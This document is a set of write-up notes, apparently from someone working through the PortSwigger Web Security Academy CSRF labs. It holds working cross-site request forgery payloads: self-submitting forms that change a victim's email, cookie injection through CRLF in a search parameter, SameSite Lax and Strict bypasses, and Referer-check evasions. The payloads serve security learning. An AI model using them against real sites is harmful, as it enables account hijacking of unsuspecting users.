# CSRF

- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#what-is-a-site-in-the-context-of-samesite-cookies
- https://portswigger.net/web-security/csrf/bypassing-token-validation
- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
- https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses
- https://portswigger.net/web-security/csrf#how-to-construct-a-csrf-attack
- https://tools.nakanosec.com/csrf/

## CSRF vulnerability with no defenses

Check email change request using burp and generate csrf form using https://tools.nakanosec.com/csrf/

Due to https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests:

```
Some requests don't trigger a CORS preflight. Those are called simple requests from the obsolete CORS spec, though the Fetch spec (which now defines CORS) doesn't use that term.

The motivation is that the <form> element from HTML 4.0 (which predates cross-site XMLHttpRequest and fetch) can submit simple requests to any origin, so anyone writing a server must already be protecting against cross-site request forgery (CSRF).
```

So it is prefered to use `<form>` because it "bypasses" `CORS`

```
<html>
	<body>
		<form method="POST" action="https://0a8200510435839080008f1a003a008d.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
			<input type="submit" value="Submit">
		</form>
        <script>
            document.forms[0].submit()
        </script>
	</body>
<html>
```

## CSRF where token validation depends on request method

Application allow changing email via GET request and does not validate CSRF tokens in GET requests.

Deliver to victim:
```
<img src="https://0afd00f40477303a87a067c200da00ec.web-security-academy.net/my-account/change-email?email=pwned%40email.com" alt="Cute-cats.png"/>
```
## CSRF where token validation depends on token being present

Application skip CSRF token check if there is no token present.

Create request changing email and generate PoC CSRF form:

```
<html>
	<body>
		<form method="POST" action="https://0a9f00220461d3ad80b049b6001d00c8.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
			<input type="submit" value="Submit">
		</form>
        <script>
            document.forms[0].submit()
        </script>
	</body>
<html>
```

## CSRF where token is not tied to user session

Perform GET request to a page with CSRF token as logged in user and copy its value. (here it is `A1tFmT23frESJoZoNOABO3sECg3JY4gM`)

After that CSRF for any other user can be performed using our token.

Deliver this to victim:

```
<html>
	<body>
		<form method="POST" action="https://0aa700cd040785e182702e4600470008.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
            <input type="hidden" name="csrf" value="A1tFmT23frESJoZoNOABO3sECg3JY4gM"/>
			<input type="submit" value="Submit">
		</form>
        <script>
            document.forms[0].submit()
        </script>
	</body>
<html>
```

## CSRF where token is tied to non-session cookie

CSRF tokens are separated from session, but tied to different cookie `csrfKey`. Only supplying valid `csrf token` generated for provided `csrfKey` will result in a success.

Accessing a page with a form we generate valid `csrf token` for our `csrfKey`.

Application contains cookie named `LastSearchTerm` which we can make us of in order to change `csrfKey` cookie of the victim. `LastSearchTerm` value is reflected to the response, so making a specific request will change `csrfKey` cookie.

Normal response
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=A; Secure; HttpOnly
```

Our request with payload:
```
https://0a2800fb036089008326ec5000a5004e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=UcLvcqDOpmMVcvGbc5g6oVRlR35scH1n%3b%20SameSite=None
```

Resulting response:
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=UcLvcqDOpmMVcvGbc5g6oVRlR35scH1n; SameSite=None; Secure; HttpOnly
```

Deliver this payload with our pre-created `csrf` value generated with provided `csrfKey` cookie to the victim to change their email:
```
<html>
	<body>
        <!-- Perform changin csrfKey GET request -->
        <img src="https://0a2800fb036089008326ec5000a5004e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=UcLvcqDOpmMVcvGbc5g6oVRlR35scH1n%3b%20SameSite=None" alt="Redirecting..."/>  
		
        <form method="POST" action="https://0a2800fb036089008326ec5000a5004e.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
            <input type="hidden" name="csrf" value="5w3aESh30qnR4UNhe3EEcLsDfvRSdl8s"/>
		</form>
        <script>
            <!-- Wait until csrfKey is changed and make a POST request changing email -->
            window.addEventListener("load", ()=>{
                document.forms[0].submit()
            })
        </script>
	</body>
<html>
```

Other interesting proposition from solution to replace listening for load event:
```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

## CSRF where token is duplicated in cookie

Similarly to previous lab we can set the cookie for the user making a get request:
```
https://0a6d00910467fbba83795ae0001e0069.web-security-academy.net/?search=A%0d%0aSet-Cookie:+csrf=CustomCSRFToken;%20SameSite=None
```

Now as we know the value of `csrf` cookie (because we set it), we can bypass `double submit` csrf protection and make a request with our `CustomCSRFToken` in the body (as the cookie with the same value will be sent along).

Sent this payload to the victim:
```
<html>
	<body>
        <!-- Perform changing csrf cookie GET request -->
        <img src="https://0a6d00910467fbba83795ae0001e0069.web-security-academy.net/?search=A%0d%0aSet-Cookie:+csrf=CustomCSRFToken;%20SameSite=None" alt="Redirecting...">

		<form method="POST" action="https://0a6d00910467fbba83795ae0001e0069.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
			<input type="hidden" name="csrf" value="CustomCSRFToken"/>
		</form>

        <script>
            <!-- Wait until csrf cookie is changed and make a POST request changing email -->
            window.addEventListener("load", ()=>{
                document.forms[0].submit()
            })
        </script>
	</body>
<html>
```

Other interesting proposition from solution to replace listening for load event:
```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

## SameSite Lax bypass via method override

No `SameSite` policy with session cookie, so in Chrome it will be defaulted to `Lax` by default (Cookie will not be sent along with POST, UPDATE etc. request by scripts without user click).

For changing email no CSRF tokens are present. 

Simply changing method to GET (in order to bypass `Samesite=Lax`) for email change results in error, but by adding `_method=POST` we can trick symphony to treat this request as `POST`

Additionally for `SameSite=Lax`:

```
Likewise [for cross-site requests], the cookie is not included in background requests, such as those initiated by scripts, iframes, or references to images and other resources.
```

So delivered payload must redirect user to the page:

```
<script>
    location = "https://0a59002804eaa52182f45caa009800e2.web-security-academy.net/my-account/change-email?email=pwned%40email.com&_method=POST"
</script>
```

## SameSite Strict bypass via client-side redirect

Email change request does not care if its POST or GET.

After comment creation we have client side redirection on confirmation page. Copying the code and testing it with little tweaks in browser:

```
<h1></h1>

<script>
redirectOnConfirmation = (blogPath) => {
    const url = new URL(window.location);
    const postId = url.searchParams.get("postId");
    document.querySelector("h1").innerText = blogPath + '/' + postId;
}
redirectOnConfirmation("/post")
</script>
```

I was able to find that this payload should trigger the email change

```
?postId=../my-account/change-email?email=pwned%40email.com&submit=1
```

Payload for victim (`?` and `&` nned to be encoded for them to get pass through to the second page as parameters and not get interpreted as such here):

```
<script>
    location = "https://0a5b006603a1708f80538fe7008100c9.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3femail=pwned%40email.com%26submit=1"
</script>
```

## SameSite Lax bypass via cookie refresh

Logging in to the Application performs `OAuth` flow with start at request to `/social-login` with redirection to login form.

The last request of the flow `/oauth-callback?code=` sets a `session` cookie without `SameSite` applied, so it defaults to `Lax`, but with a catch.

Defaulted `SameSite` to `Lax` have 2 minute windows in which the cookie will be sent with POST requests, in order to not break an OAuth flows.

Changing email feature does not require any random secrets, so it is vulnerable to CSRF.

Accessing `/social-login` again when logged in will set new `session` cookie regardless if we are logged in, giving us new 2 minute windows to perform our CSRF.

Payload for victim:
```
<!-- Changing email form -->
<form method="POST" action="https://0af3007a037099168164c31f00d500b0.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@email.com">
</form>

<a>Click here to gain your new IPhone!</a>

<script>
    <!-- Bypass pop up blocker. Open reseting session cookie tab on user click -->
    window.onclick = () => {
        window.open('https://0af3007a037099168164c31f00d500b0.web-security-academy.net/social-login');
        
        <!-- Wait until session cookie is reset and perform changing email CSRF -->
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

## CSRF where Referer validation depends on header being present

Changing email request does not require any random secret, so its vulnerable to CSRF.

Changing the `Referer` results in `Invalid referer header` error. But removing it completely bypasses the check and results in success.

Payload for victim:
```
<html>
    <!-- Do not send Referer header with this request -->
    <meta name="referrer" content="never">

	<body>
		<form method="POST" action="https://0ad5001d035e318b80cf12dc00200057.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
		</form>

        <script>
            document.forms[0].submit()
        </script>
	</body>
<html>
```

## CSRF with broken Referer validation

Same scenario as above, but this this error is returned when no `Referer` header is present.

`Referer` header check is naive and check only if `0ace00b303c63a7c80b82b3600aa005d.web-security-academy.net` is present.
Values like `XXXX0ace00b303c63a7c80b82b3600aa005d.web-security-academy.netXXXX` are accepted.

Configure our exploit server to responde with header:

```
Referrer-Policy: unsafe-url
``` 

and craft link to our exploit to include required `Referer` value. Something like:

```
https://exploit-0afa002b03ea3a4980d22a3b018d009b.exploit-server.net/exploit?q=0ace00b303c63a7c80b82b3600aa005d.web-security-academy.net
```

With this preparation the request sent from our site accesed from the link above will container required `Referer` header part and will be able to perform CSRF changing email.

Payload for victim:
```
<html>
	<body>
		<form method="POST" action="https://0ace00b303c63a7c80b82b3600aa005d.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
		</form>
        <script>
            document.forms[0].submit()
        </script>
	</body>
<html>
```

For local tests this approached worked fine. But not for the victim for some reason.

Updated payload:

```
<html>
	<body>
		<form method="POST" action="https://0ace00b303c63a7c80b82b3600aa005d.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
		</form>
        <script>
            history.pushState("", "", "/?0ace00b303c63a7c80b82b3600aa005d.web-security-academy.net")
            document.forms[0].submit()
        </script>
	</body>
<html>
```

Now access link to payload does not contain `q` param with required `Referer` part. `Referrer-Policy` was preserved.

Now this exploit works locally and for the victim.